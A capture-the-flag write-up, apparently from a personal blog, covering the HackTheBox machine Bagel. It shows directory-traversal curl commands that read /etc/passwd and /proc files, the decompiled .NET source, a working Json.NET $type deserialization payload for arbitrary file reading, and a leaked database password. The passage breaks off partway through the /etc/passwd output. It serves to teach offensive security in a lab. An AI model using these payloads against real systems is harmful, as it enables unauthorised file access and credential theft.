---
title: HTB: Bagel
url: https://0xdf.gitlab.io/2023/06/03/htb-bagel.html
date: 2023-06-03T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-bagel, hackthebox, nmap, python, flask, source-code, file-read, dotnet, websocket, ffuf, reverse-engineering, proc, wscat, dnspy, json, json-deserialization, dotnet-deserialization, json.net
---

![Bagel](/img/bagel-cover.png)

Bagel is centered around two web apps. The first is a Flask server. I’ll exploit a file read vulnerability to locate and retrieve the source. In that source, I see how it connects to the other .NET server over web sockets. I’ll abuse the first file read to get the DLL for that server. On reversing that DLL, I’ll find a JSON derserialization issue, and exploit it to get file read and the user’s SSH key. I’ll pivot to the next user using creds from the DLL. To get root, I’ll exploit a sudo rule that let’s the user run dotnet as root.

## Box Info

| Name | [Bagel](https://hackthebox.com/machines/bagel)  [Bagel](https://hackthebox.com/machines/bagel) [Play on HackTheBox](https://hackthebox.com/machines/bagel) |
| --- | --- |
| Release Date | [18 Feb 2023](https://twitter.com/hackthebox_eu/status/1626265175765487618) |
| Retire Date | 03 Jun 2023 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Bagel |
| Radar Graph | Radar chart for Bagel |
| First Blood User | 01:32:22[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 01:35:39[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [CestLaVie CestLaVie](https://app.hackthebox.com/users/298338) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22) and two HTTP (5000 and 8000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.201
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-30 15:21 EDT
Nmap scan report for 10.10.11.201
Host is up (0.088s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 6.97 second
oxdf@hacky$ nmap -p 22,5000,8000 -sCV 10.10.11.201
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-30 15:27 EDT
Nmap scan report for 10.10.11.201
Host is up (0.087s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 30 May 2023 19:27:57 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 30 May 2023 19:28:12 GMT
...[snip]...
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Tue, 30 May 2023 19:27:57 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
...[snip]...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.13 seconds

```

The OpenSSH version doesn’t line up with anything familiar. The HTTP server on 5000 says it’s DotNet (`Microsoft-NetCore/2.0`), while the one on 8000 says it’s Python.

### HTTP - TCP 5000

Visiting this webserver in a browser returns an empty page. Looking a bit more closely in Burp, it’s a 400 Bad Request with an empty body:

```

HTTP/1.1 400 Bad Request
Server: Microsoft-NetCore/2.0
Date: Tue, 30 May 2023 19:48:23 GMT
Connection: close
Content-Length: 0

```

I’ll brute force the server with `feroxbuster`, but it doesn’t find anything either.

I’ve already noted this server is running DotNet, which is interesting for a Linux machine. Not much else here for now.

### bagel.htb - TCP 8000

Visiting by IP address returns a redirect to `http://bagel.htb:8000/?page=index.html`. I’ll add `bagel.htb` to my `/etc/hosts` file and reload. It’s a company selling bagels:

[![image-20230530160029408](/img/image-20230530160029408.png)](/img/image-20230530160029408.png)

[*Click for full image*](/img/image-20230530160029408.png)

There’s one link on the page, which goes to `/orders`. This returns text showing orders (best viewed in “view-source” or with `curl`):

```

oxdf@hacky$ curl bagel.htb:8000/orders
order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]
order #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]
order #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] 

```

#### Tech Stack

The URL pattern for the main page is odd for Python: `http://bagel.htb:8000/?page=index.html`. That pattern is typically seen in PHP applications, as it has an `include` keyword..

The HTTP response headers show it is Python:

```

HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Tue, 30 May 2023 19:57:04 GMT
Content-Disposition: inline; filename=index.html
Content-Type: text/html; charset=utf-8
Content-Length: 8698
Last-Modified: Thu, 26 Jan 2023 17:40:39 GMT
Cache-Control: no-cache
ETag: "1674754839.6421967-8698-149884447"
Date: Tue, 30 May 2023 19:57:04 GMT
Connection: close

```

Werkzeug is typically seen with Flask, but could be other frameworks as well. The 404 page matches the default Flask 404 as well:

![image-20230530161448092](/img/image-20230530161448092.png)

![image-20230530161705843](/img/image-20230530161705843.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it finds nothing new:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.201:8000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.201:8000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        5l       22w      263c http://10.10.11.201:8000/ => http://bagel.htb:8000/?page=index.html
200      GET        3l       37w      267c http://10.10.11.201:8000/orders
[####################] - 1m     30000/30000   0s      found:2       errors:0      
[####################] - 1m     30000/30000   275/s   http://10.10.11.201:8000/ 

```

### Subdomain Brute Force

Given the use of subdomains, I’ll try to brute-force on both webservers to see if either has any subdomains that respond differently from the default response:

```

oxdf@hacky$ ffuf -u http://10.10.11.201:8000 -H "Host: FUZZ.bagel.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
...[snip]...
       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.201:8000
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.bagel.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 223 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
oxdf@hacky$ ffuf -u http://10.10.11.201:5000 -H "Host: FUZZ.bagel.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
...[snip]...
       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.201:5000
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.bagel.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 224 req/sec :: Duration: [0:00:23] :: Errors: 0 ::

```

Neither find anything.

## Shell as phil

### Get Flask Source

#### Identify

I noted above the URL structure that seems to be loading a static HTML page on the main site: `http://bagel.htb:8000/?page=index.html`. My guess is that the server has a main page that handles things typically like a menu bar, and then loads the child page into the body.

I’ll try a basic file read / directory traversal attack to see if I can read other files on the filesystem:

```

oxdf@hacky$ curl http://bagel.htb:8000/?page=../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
...[snip]...

```

That’s a successful file read / directory traversal (though not an LFI, please don’t call it that).

#### Process Information

I’ll use this vulnerability to get information about the running process. Each process has a folder in `/proc/[pid]`, and `/proc/self` is a special folder that points to the current pid.

Inside each folder, there’s a bunch of files and symlinks. `cmdline` shows the running command line of the process:

```

oxdf@hacky$ curl http://bagel.htb:8000/?page=../../../../proc/self/cmdline
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
oxdf@hacky$ curl -o- http://bagel.htb:8000/?page=../../../../proc/self/cmdline
python3/home/developer/app/app.py

```

This file uses null bytes to terminate the command string and the argument string, which makes the output “binary” and `curl` complains. Adding `-o-` is typically good enough to say “print the result to the terminal anyway”. There is an invisible null byte between `python3` and `/home`. If I want to be detailed, I can use `tr` to replace the nulls with spaces:

```

oxdf@hacky$ curl -o- -s http://bagel.htb:8000/?page=../../../../proc/self/cmdline | tr '\000' ' '
python3 /home/developer/app/app.py 

```

I can also get the environment variables from `environ` (this time replacing null with newline):

```

oxdf@hacky$ curl -s http://bagel.htb:8000/?page=../../../../proc/self/environ -o- | tr '\000' '\n'
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
HOME=/home/developer
LOGNAME=developer
USER=developer
SHELL=/bin/bash
INVOCATION_ID=3f19c33fc85b4cc0aa821a93d7deb345
JOURNAL_STREAM=8:25240
SYSTEMD_EXEC_PID=892

```

The process is running as developer (which makes sense as it’s running out of developer’s home directory).

I can also use the command line to get the path to the source:

```

oxdf@hacky$ curl -o- -s http://bagel.htb:8000/?page=../../../../home/developer/app/app.py
from flask import Flask, request, send_file, redirect, Response
import os.path
...[snip]...

```

### Source Code Analysis

`app.py` is a simple single-file Flask application. It starts by importing libraries and initializing the Flask application:

```

from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

```

`websocket` is an interesting import.

There are two routes defined. `index` is the main page:

```

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

```

This is what takes the `page` parameter and reads the file, returning it.

`order` handles `/order`. The comment here talks about starting the DotNet application first. It also references the user of SSH keys.

```

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

```

It makes a websocket connection to port 5000 (the DotNet application that I couldn’t get much out of earlier). It sends `{"ReadOrder":"orders.txt"}`, and then returns the `ReadOrder` key from the result.

### Enumerating Websocket

#### Interacting with Websocket

To quickly poke at the web socket, I’ll use [wscat](https://github.com/websockets/wscat). It installs with `npm install -g wscat`, and I’ll use `-c` to connect to the URL observed in the Flask the source:

```

oxdf@hacky$ wscat -c ws://bagel.htb:5000
Connected (press CTRL+C to quit)
>

```

At the `>`, I’ll send what the Flask app sends:

```

> {"ReadOrder":"orders.txt"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "2:02:30",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": "order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]\norder #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]\norder #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] \n"
}

```

The response (marked with `<`) is JSON data, with the data in `ReadOrder` (which is what the Flask app pulls and returns). There’s also a `WriteOrder` and `RemoveOrder` which are null.

#### WriteOrder

I can try these. If I send `{"WriteOrder":"orders.txt"}`, it reports success:

```

> {"WriteOrder":"orders.txt"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "2:12:16",
  "RemoveOrder": null,
  "WriteOrder": "Operation successed",
  "ReadOrder": null
}

```

If I read again, it seems to have actually taken the data in `WriteOrder` and written that to `orders.txt`:

```

> {"ReadOrder":"orders.txt"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "2:11:31",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": "orders.txt"
}

```

Another write confirms that:

```

> {"WriteOrder":"0xdf was here"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "2:13:22",
  "RemoveOrder": null,
  "WriteOrder": "Operation successed",
  "ReadOrder": null
}
> {"ReadOrder":"orders.txt"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "2:13:27",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": "0xdf was here"
}

```

#### RemoveOrder

Sending a file name for `RemoveOrder` doesn’t seem to change anything:

```

> {"RemoveOrder":"orders.txt"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "2:14:07",
  "RemoveOrder": "orders.txt",
  "WriteOrder": null,
  "ReadOrder": null
}
> {"ReadOrder":"orders.txt"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "2:14:16",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": "0xdf was here"
}

```

### Failed Directory Traversal

I went down a bit of a rabbit hole fuzzing for some kind of directory traversal / file read using the websocket and looking at other ways to exploit it.

I’ll try to read `/etc/passwd` as this application:

```

> {"ReadOrder":"../../../../../../../../../etc/passwd"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "1:54:46",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": "Order not found!"
}

```

It just returns “Order not found!” After playing around for a bit, I’ll try to read `../orders.txt`:

```

> {"ReadOrder":"../orders.txt"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "2:15:51",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": "0xdf was here"
}

```

It returns `orders.txt`. That implies that the `../` got removed. This seems to confirm:

It’s not uncommon in PHP that sending something like `....//` gets filtered down to `../` when the inner `../` is removed. That doesn’t work here:

```

> {"ReadOrder":"....//orders.txt"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "2:17:45",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": "0xdf was here"
}

```

I would expect a not found if the `../` got through. It seems that all `..` and `/` are removed. That is confirmed by this:

```

> {"ReadOrder":"o..rd/er..s//.txt"}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "7:12:15",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": "0xdf was here"
}

```

When the `..` and `/` are removed, it leaves `orders.txt`.

### Get bagel.dll

#### Strategy

I’d like to find what is running the service on 5000 just like I did for 8000. The comment in the source said to run it with `dotnet <dll>`. I’ll use `ffuf` to scan over a range of pids, and `-mr dotnet` to match results that have “dotnet” in them. With the command line to the process running `dotnet`, I’ll either get the full path to the dll, or I’ll get a relative path, which is still good enough (as I can then use the `cwd` symlink in `/proc/[pid]` to get into that directory and get the file).

#### Fuzz

`ffuf` doesn’t have a `range` generation like `wfuzz`, but I can use `<( seq 1 10000)` to make a temp file with the numbers 1 to 10000 in it one per line.

```

oxdf@hacky$ ffuf -u http://bagel.htb:8000/?page=../../../../proc/FUZZ/cmdline -w <(seq 1 10000) -mr 'dotnet'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bagel.htb:8000/?page=../../../../proc/FUZZ/cmdline
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: dotnet
________________________________________________

890                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 86ms]
924                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 92ms]
926                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 92ms]
925                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 103ms]
927                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 101ms]
928                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 99ms]
929                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 96ms]
930                     [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 102ms]
1035                    [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 92ms]
1043                    [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 88ms]
1045                    [Status: 200, Size: 45, Words: 1, Lines: 1, Duration: 90ms]
:: Progress: [10000/10000] :: Job [1/1] :: 229 req/sec :: Duration: [0:00:44] :: Errors: 0 ::

```

There’s a bunch of hits, but all the same size (and all the same on some inspection).

#### Get File

The various `cmdlines` are all the same:

```

oxdf@hacky$ curl -o- http://bagel.htb:8000/?page=../../../../proc/924/cmdline
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll

```

I’m able to get the DLL file:

```

oxdf@hacky$oxdf@hacky$ curl -o bagel.dll http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10752  100 10752    0     0  61497      0 --:--:-- --:--:-- --:--:-- 61793
oxdf@hacky$ file bagel.dll 
bagel.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows

```

### Reverse bagel.dll

#### Strategy

Because the executable is a .Net assembly, that means it will decompile back to something resembling source fairly easily. There are tools to do this on Linux (such as [ilspy](https://github.com/icsharpcode/ILSpy)) and many on Windows. My favorite is [DNSpy](https://github.com/dnSpy/dnSpy), which runs on Windows, and I’ll show that here. The others are just as good - I’d recommend people use the one they are most comfortable with.

#### Overview

The program has the namespace `bagel_server`, with six classes in it. The main program is based out of the `Bagel` class, which starts in `Main`, but really is handled by `MessgeReceived`.

![image-20230530202711370](/img/image-20230530202711370.png)

The other important classes for understanding how the program works and how to exploit it are `Handler`, `Orders`, and `File`. I’ll also look at the `DB` class to get some information for later.

#### Bagel

`Main`, `InitializeServer`, and `StartServer` are all involved in getting the server up and running. `MessageReveived` runs each time there’s a message on the websocket:

```

private static void MessageReceived(object sender, MessageReceivedEventArgs args)
{
    string json = "";
    bool flag = args.Data != null && args.Data.Count > 0;
    if (flag)
    {
        json = Encoding.UTF8.GetString(args.Data.Array, 0, args.Data.Count);
    }
    Handler handler = new Handler();
    object obj = handler.Deserialize(json);
    object obj2 = handler.Serialize(obj);
    Bagel._Server.SendAsync(args.IpPort, obj2.ToString(), default(CancellationToken));
}

```

A `Handler` object is created, and used to `Deserialize` the received JSON. Then the result is passed back to `Seialize` and the resulting string is sent back.

The entire structure of this program is designed such that each object has a getter and a setter function. When the object is created, the setter is called. When it is serialized into JSON, the getter is called.

While reading this code, it’s important to remember that JSON is deserialized into an object by calling the setter. An object is serialized into JSON by calling the getter.

#### Handler

The `Handler` class is easy to overlook, but it is where the vulnerability is configured. A `Handler` object has two methods, `Serialize` and `Deserialize`:

```

using System;
using System.Runtime.CompilerServices;
using Newtonsoft.Json;

namespace bagel_server
{
    // Token: 0x02000005 RID: 5
    [NullableContext(1)]
    [Nullable(0)]
    public class Handler
    {
        // Token: 0x06000005 RID: 5 RVA: 0x00002094 File Offset: 0x00000294
        public object Serialize(object obj)
        {
            return JsonConvert.SerializeObject(obj, 1, new JsonSerializerSettings
            {
                TypeNameHandling = 4
            });
        }

        // Token: 0x06000006 RID: 6 RVA: 0x000020BC File Offset: 0x000002BC
        public object Deserialize(string json)
        {
            object result;
            try
            {
                result = JsonConvert.DeserializeObject<Base>(json, new JsonSerializerSettings
                {
                    TypeNameHandling = 4
                });
            }
            catch
            {
                result = "{\"Message\":\"unknown\"}";
            }
            return result;
        }
    }
}

```

It’s using `JsonConvert` ([docs](https://www.newtonsoft.com/json/help/html/t_newtonsoft_json_jsonconvert.htm)), part of the `Newtonsoft.Json` package.

`SerializeObject` takes an object and returns a JSON serialized object (a string). `DeserializeObject` does that opposite, going from JSON string to a `Base` object in in memory. It’s important to note that it must be a `Base` object (as specified by the `<Base>` syntax).

The fact that both are setting the `TypeNameHandling` to 4 is important. [The docs](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm) hint at the risk here:

![image-20230530211531632](/img/image-20230530211531632.png)

The value is set to 4 = Auto here.

#### Orders

An `Orders` object has three public properties, `ReadOrder`, `RemoveOrder`, and `WriteOrder`, as well as three private members, `file`, `order_filename`, and `order_info`.

In C# (and other programming languages), a [property](https://codeeasy.io/lesson/properties) is a member of the class with a function defined for when something tries to read it (the getter) and another defined for when something tries to write it (the setter). The `ReadOrder` property is defined as:

```

public string ReadOrder
{
    get
    {
        return this.file.ReadFile;
    }
    set
    {
        this.order_filename = value;
        this.order_filename = this.order_filename.Replace("/", "");
        this.order_filename = this.order_filename.Replace("..", "");
        this.file.ReadFile = this.order_filename;
    }
}

```

When `ReadOrder` is set, it sets `this.file.ReadFile` to the input value, after removing `/` and `..` (which explains why I couldn’t traverse above). When the object is read from it calls the `get`, which is a `file.ReadFile` property (so the getter from this object property).

`WriteOrder` is very similar:

```

public string WriteOrder
{
    get
    {
        return this.file.WriteFile;
    }
    set
    {
        this.order_info = value;
        this.file.WriteFile = this.order_info;
    }
}

```

It will call the setter on `WriteFile` with the input value, and then the result will be the getter on that same object.

`RemoveOrder` doesn’t define the getter and setter, which means that by default it just saves the value passed in, and returns it when read:

```

public object RemoveOrder { get; set; }

```

#### Base

The `Base` class derives from the `Orders` class:

```

using System;
using System.Runtime.CompilerServices;

namespace bagel_server
{
    // Token: 0x02000007 RID: 7
    [NullableContext(1)]
    [Nullable(0)]
    public class Base : Orders
    {
...[snip]...

```

This means it has all the properties / members of `Order`, plus three properties (`UserId`, `Session`, and `Time`) and two private members (`userid` and `session`). It sets `userid` to 0 and `session` to “Unauthorized”, and the setters are never called.

#### File

The `File` class defines `ReadFile` and `WriteFile`. `ReadFile` has getter and setter functions:

```

public string ReadFile
{
    get
    {
        return this.file_content;
    }
    set
    {
        this.filename = value;
        this.ReadContent(this.directory + this.filename);
    }
}

```

So when above `this.file.ReadFile` is set equal to something, `this.filename` becomes that something, and then `ReadContent` is called with `this.directory + this.filename`. These two are initialized to:

```

    private string directory = "/opt/bagel/orders/";
    private string filename = "orders.txt";

```

`ReadContent` sets `this.file_content` to the values read from the file, or to “Order not found!”:

```

    public void ReadContent(string path)
    {
        try
        {
            IEnumerable<string> values = File.ReadLines(path, Encoding.UTF8);
            this.file_content += string.Join("\n", values);
        }
        catch (Exception ex)
        {
            this.file_content = "Order not found!";
        }
    }

```

Then when the getter on `ReadFile` is called, it returns `this.file_content`.

`WriteFile` is similar:

```

public string WriteFile
{
    get
    {
        return this.IsSuccess;
    }
    set
    {
        this.WriteContent(this.directory + this.filename, value);
    }
}

```

On calling the setter, it calls `WriteContent` on the current file, which writes the file, and sets `this.IsSuccess`:

```

public void WriteContent(string filename, string line)
{
    try
    {
        File.WriteAllText(filename, line);
        this.IsSuccess = "Operation successed";
    }
    catch (Exception ex)
    {
        this.IsSuccess = "Operation failed";
    }
}

```

The getter returns `this.IsSuccess`.

#### DB

The DB class isn’t in use. It seems to be in-development for later use. Still, it has a connection string in it:

```

using System;
using Microsoft.Data.SqlClient;

namespace bagel_server
{
    // Token: 0x0200000A RID: 10
    public class DB
    {
        // Token: 0x06000022 RID: 34 RVA: 0x00002518 File Offset: 0x00000718
        [Obsolete("The production team has to decide where the database server will be hosted. This method is not fully implemented.")]
        public void DB_connection()
        {
            string text = "Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K";
            SqlConnection sqlConnection = new SqlConnection(text);
        }
    }
}

```

I’ll note that password for later.

### Follow a Message

This diagram attempts to summaries how the base case of the message `{"ReadOrder": "orders.txt"}` is processed by the server:

[![image-20230531134139772](/img/image-20230531134139772.png)*Click for full size image*](/img/image-20230531134139772.png)

### Get Private SSH Key

#### Strategy

The issue comes down to where the `JsonSerializerSettings` sets the `TypeNameHandling` to 4, which is Auto. When serializing to JSON, .NET can include the .NET type name in the object / array or not. Auto allows for leaving it out, or including it if the object type doesn’t match what is declared in the code.

[This article](https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15) is a summary of [this very detailed blackhat paper](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf), and gives examples of vulnerable code, and how to abuse it.

![image-20230530212059405](/img/image-20230530212059405.png)

This looks very much like what comes back from the `Handler.Deserialize` call.

To abuse this, I need a object that has either an empty constructor or only one constructor with parameters. All of the object constructors are empty in this application, so that fits.

The top level object will be `Base` object. My attack is going to be

I’ll use the `RemoveOrder` object since it’s getter doesn’t do anything, which is good so it won’t interfere with my attack. I’ll pass an object that in the process of deserializing the `RemoveOrder` object, also deserializes a `ReadFile` object. This object can read arbitrary files. The challenge is that to create one through the legit path requires going through the `ReadOrder` object, which filters out `..` and `/`. If I can create one directly, I can read arbitrary files.

#### Build Payload

The [Json.NET docs](https://www.newtonsoft.com/json/help/html/serializetypenamehandling.htm) give some examples of what it looks like with the different `TypeNameHandling` settings. When the type of the object is included, the JSON might look like:

```

{
  "$type": "Namespace.ClassName, AssemblyName",
  "Property1": "value1",
  "Property2": "value2"
}

```

This tells Dotnet to handle this as a different type of object when it deserializes it from JSON into an object. I’m going to submit an object as `RemoveOrder`, as that blindly sets whatever I send as the value, and thus I can get it to create (and call the setter for) another object. I’ll have a `File` object created, with the `ReadFile` set to the contents of `/etc/passwd`. That will look something like:

```

{
	"RemoveOrder": {
		"$type": "bagel_server.File, bagel"
        "ReadFile": "../../../../etc/passwd"
	}
}

```

The Namespace is what I noted [above](#overview), and the ClassName is the class with the object. The AssemblyName I’ll get from PowerShell:

```

PS > [System.Reflection.AssemblyName]::GetAssemblyName('Z:\bagel.dll')

Version        Name
-------        ----
1.0.0.0        bagel

```

This diagram shows how this payload is processed by the server:

[![image-20230531134205700](/img/image-20230531134205700.png)*Click for full size image*](/img/image-20230531134205700.png)

#### POC

To test this, I’ll get rid of the white space to get it on one line, and send:

```

> {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../etc/passwd"}}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "4:21:03",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\ntss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin\nsystemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin\nsystemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin\nsystemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin\npolkitd:x:998:997:User for polkitd:/:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nabrt:x:173:173::/etc/abrt:/sbin/nologin\nsetroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin\ncockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin\ncockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin\nchrony:x:994:992::/var/lib/chrony:/sbin/nologin\ndnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nsystemd-coredump:x:989:989:systemd Core 